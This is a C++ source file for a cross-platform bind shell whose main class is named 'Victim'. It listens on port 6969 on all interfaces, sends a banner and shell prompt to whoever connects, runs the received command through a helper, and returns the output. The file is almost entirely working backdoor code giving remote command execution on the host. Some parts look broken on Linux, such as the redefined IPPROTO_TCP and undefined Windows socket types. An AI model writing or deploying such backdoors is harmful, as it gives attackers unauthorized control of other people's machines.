#include <stdio.h> 
#include <stdlib.h> 
#include "helpers.h"

#ifdef _WIN32
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#endif
#ifdef __linux__
#include <unistd.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>
#define IPPROTO_TCP 0
#endif

class Victim {
	std::string ipAddr;
	int portNumber;
public:
	Victim(std::string ipAddr = "0.0.0.0", int portNumber = 6969)
		: ipAddr(ipAddr), portNumber(portNumber)
	{ }
	void setIPAddress(std::string ipAddr) { this->ipAddr = ipAddr; }
	void setPortNumber(int portNumber) { this->portNumber = portNumber; }

	bool establishConnection() {
		const int BUFFER_LENGTH = 4096;
#ifdef _WIN32
		WSADATA winSockData;
		int iWsaStartup;
		int iWsaCleanup;
#endif
		SOCKET TCPServerSocket;
		int iCloseSocket;

		sockaddr_in TCPServerAddr;
		sockaddr_in TCPClientAddr;
		int iTCPClientAddr = sizeof(TCPClientAddr);

		int iBind;
		int iListen;

		SOCKET sAcceptSocket;
		int iSend;
		int iRecv;
		char recvBuffer[BUFFER_LENGTH] = { 0 };
		int iRecvBuffer = strlen(recvBuffer) + 1;

		int maxConns = 2;

		// Actual Code
		Helpers::divider();
#ifdef _WIN32
		WORD wVersion = MAKEWORD(2, 2);
		iWsaStartup = WSAStartup(wVersion, &winSockData);

		if (iWsaStartup != 0) {
			std::cout << "[!] WSAStartup Failed!.\nFollowing error occurred: " << iWsaStartup << std::endl;
			return false;
		}
		std::cout << "[*] WSAStartup Successful!\n";
#endif

		TCPServerAddr.sin_family = AF_INET;
#ifdef _WIN32
		TCPServerAddr.sin_addr.S_un.S_addr = inet_addr(this->ipAddr.c_str());
#endif
#ifdef __linux__
		TCPServerAddr.sin_addr.s_addr = inet_addr(this->ipAddr.c_str());
#endif
		TCPServerAddr.sin_port = htons(this->portNumber);

		TCPServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (TCPServerSocket == INVALID_SOCKET) {
			std::cout << "[!] Unable to create socket!\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		#ifdef __linux__
		int opt = 1;
		if (setsockopt(TCPServerSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,&opt, sizeof(opt))){
			std::cout << "[!] An Error occurred while setting the socket options!\n";
			return false;
		}
		#endif
		iBind = bind(TCPServerSocket, (sockaddr*)&TCPServerAddr, sizeof(TCPServerAddr));
		if (iBind == SOCKET_ERROR) {
			std::cout << "[!] Unable to bind to " << ipAddr << " on port " << portNumber << std::endl;
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		iListen = listen(TCPServerSocket, maxConns);
		if (iListen == SOCKET_ERROR) {
			std::cout << "[!] Unable to listen on port " << portNumber << std::endl;
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		std::cout << "[*] Listening on " << ipAddr << ":" << portNumber << std::endl;
		Helpers::divider();
		sAcceptSocket = accept(TCPServerSocket, (sockaddr*)&TCPClientAddr, (socklen_t*)&iTCPClientAddr);
		if (sAcceptSocket == INVALID_SOCKET) {
			std::cout << "[!] An error occured while accepting connection from " << ipAddr << " on port " << portNumber << "!\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}

		// Converting the LONG Data to an IP Address
		char ipAddr[INET_ADDRSTRLEN];
#ifdef _WIN32
		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.S_un.S_addr), ipAddr, INET_ADDRSTRLEN);
#endif
#ifdef __linux__
		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.s_addr), ipAddr, INET_ADDRSTRLEN);
#endif
		std::cout << "[*] Accepted Connection from " << ipAddr << ":" << TCPClientAddr.sin_port << std::endl;
		std::string banner = Helpers::getBanner(ipAddr);
		int bannerLen = banner.length();
		banner.insert(0, Helpers::getDivider(bannerLen));
		banner += Helpers::getDivider(bannerLen);
		banner += Helpers::getShell();
		send(sAcceptSocket, banner.c_str(), banner.length(), 0);


		iRecv = recv(sAcceptSocket, recvBuffer, 4096, 0);
		if (iRecv == SOCKET_ERROR) {
			std::cout << "[!] Unable to receive data.\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}
		std::string senderBuffer = Helpers::executeCommand(recvBuffer) + '\n';
		int iSenderBuffer = strlen(senderBuffer.c_str()) + 1;
		iSend = send(sAcceptSocket, senderBuffer.c_str(), iSenderBuffer, 0);
		if (iSend == SOCKET_ERROR) {
			std::cout << "[!] Unable to send data.\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
			return false;
		}

		// Stripping new line.
		recvBuffer[std::remove_if(recvBuffer, recvBuffer + strlen(recvBuffer), [](char c) { return c == '\n'; }) - recvBuffer] = 0;
		printf("[*] Output of command %s sent to client %s successfully!\n", recvBuffer, ipAddr);

		iCloseSocket = closesocket(sAcceptSocket);
		if (iCloseSocket == SOCKET_ERROR) {
			std::cout << "[!] Unable to close socket.\n";
#ifdef _WIN32
			std::cout << "Error: " << WSAGetLastError() << std::endl;
			WSACleanup();
#endif
		}
#ifdef _WIN32
		WSACleanup();
#endif
		closesocket(TCPServerSocket);
		Helpers::divider();
		return true;
	}
};

int main() {
	Victim* v = new Victim();
	v->establishConnection();
}
